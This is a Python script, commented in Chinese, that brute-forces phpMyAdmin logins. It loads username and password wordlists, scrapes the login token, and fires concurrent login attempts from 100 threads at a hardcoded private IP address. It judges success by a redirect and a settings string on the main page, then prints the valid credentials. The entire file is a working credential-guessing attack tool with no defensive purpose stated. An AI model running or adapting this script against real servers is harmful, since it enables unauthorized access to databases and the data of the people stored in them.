import re
import threading
import requests
import aiofiles
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

# 用户名密码队列
username_list = []
password_list = []


async def read_file(filename, queue):
    """处理文件到列表中"""
    async with aiofiles.open(filename, mode="r", encoding="utf-8") as f:
        while True:
            line = await f.readline()
            if not line:
                break
            else:
                line = line.strip("\n")
                queue.append(line)


def handle_request(session, url, method, **kwargs):
    """处理请求"""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
    }
    if method == "GET":
        try:
            response = session.get(url=url, headers=header, timeout=(10, 10))
        except Exception as e:
            return None
        else:
            return response
    elif method == "POST":
        data = {
            "pma_username": kwargs.get("username"),
            "pma_password": kwargs.get("password"),
            "server": "1",
            "lang": "zh_CN",
            "token": kwargs.get("token")
        }
        try:
            response = session.post(url=url, headers=header, data=data, allow_redirects=False, timeout=(10, 10))
            return response
        except Exception as e:
            return None


def phpmyadmin_crack(host, username, password):
    """phpmyadmin密码爆破"""
    session = requests.session()
    url = host + "/phpmyadmin/index.php"
    # 第一次请求获取token
    first_response = handle_request(session=session, url=url, method="GET")
    if not first_response:
        return
    if first_response.status_code == 200 and first_response:
        # 获取token
        token_search = re.compile(r'token=(.*?)"\s?target')
        token = token_search.search(first_response.text)

        if not token:
            print("获取token失败")
            return
        else:
            token_value = token.group(1)
            login_url = host + "/phpmyadmin/index.php"
            # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
            # 第二次请求登录
            second_response = handle_request(session=session, url=login_url, method="POST",
                                             username=username,
                                             password=password,
                                             token=token_value)
            if not second_response:
                return
            if second_response.status_code != 302:
                return
            else:
                # 首页
                index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
                index_response = handle_request(session=session, url=index_url, method="GET")
                if not index_response:
                    return
                if index_response.status_code == 200 and index_response:
                    if "常规设置" in index_response.text:
                        print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
                        return True
                    else:
                        return False
                else:
                    return False


async def handle_user_pass():
    """处理用户名密码"""
    user_pass_tasks = [
        asyncio.create_task(read_file("Username.txt", username_list)),
        asyncio.create_task(read_file("Password.txt", password_list)),
    ]
    await asyncio.wait(user_pass_tasks)


def main(host, max_workers):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(handle_user_pass())
    for username in username_list:
        with ThreadPoolExecutor(max_workers=max_workers) as t:
            handle_phpmyadmin = [t.submit(phpmyadmin_crack, host=host, username=username, password=password) for
                                 password in password_list]
            wait(handle_phpmyadmin, return_when=FIRST_COMPLETED)
            for data in as_completed(handle_phpmyadmin):
                if data.result():
                    print(time.time())
                    return


if __name__ == '__main__':
    def handle_time():
        """处理时间"""
        timestamp = time.time()
        time_local = time.localtime(timestamp)
        time_format = time.strftime("%Y-%m-%d %H:%M:%S", time_local)
        return timestamp, time_format


    start_timestamp, start_time = handle_time()
    print("开始扫描时间{}".format(start_time))
    # 调用主方法
    main(host="http://192.168.52.143", max_workers=100)
    end_timestamp, end_time = handle_time()
    print("扫描完成时间{}, 扫描耗时:{}分钟".format(end_time, int((end_timestamp - start_timestamp) / 60)))
